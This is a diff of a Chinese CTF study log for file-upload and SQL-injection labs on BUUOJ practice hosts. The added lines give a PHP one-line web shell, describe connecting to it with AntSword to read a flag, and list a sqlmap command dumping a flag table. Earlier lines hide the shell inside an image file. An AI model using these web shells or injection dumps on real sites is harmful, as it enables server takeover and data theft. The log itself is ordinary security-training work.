@@ -104,4 +104,18 @@ pass14和15是一样的，将yakit的图片头换成 `{{png()}}--<?php eval($_PO
 `copy /b test.gif + pass.php pass.gif`
 但是根据教程修改下载下来的 gif 的 hex 后，服务器认为不是 gif 文件了。
 
-### pass17-20 太麻烦了，不想搞了
+### pass17-20 
+教程看上去太麻烦了，不想搞了
+
+## BUU UPLOAD COURSE 1
+上传一句话木马 pass.php
+```
+<?php eval($_POST["pass"]);?>
+```
+得到上传的文件地址后，然后使用蚁剑连接`http://169545d1-d8f9-4ad5-ae8b-85c20509798d.node5.buuoj.cn:81/index.php?file=uploads/67fb285a8f6f2.jpg`，找到根目录 flag 文件。
+
+## sqli-labs
+sql 注入的学习合集，不想学，好复杂，直接用 sqlmap 吧。
+```sh
+python .\sqlmap.py -u http://ad14b268-fed6-417a-9771-31331caea38f.node5.buuoj.cn/Less-3/?id=1 -D ctftraining -T flag -C flag --dump
+```
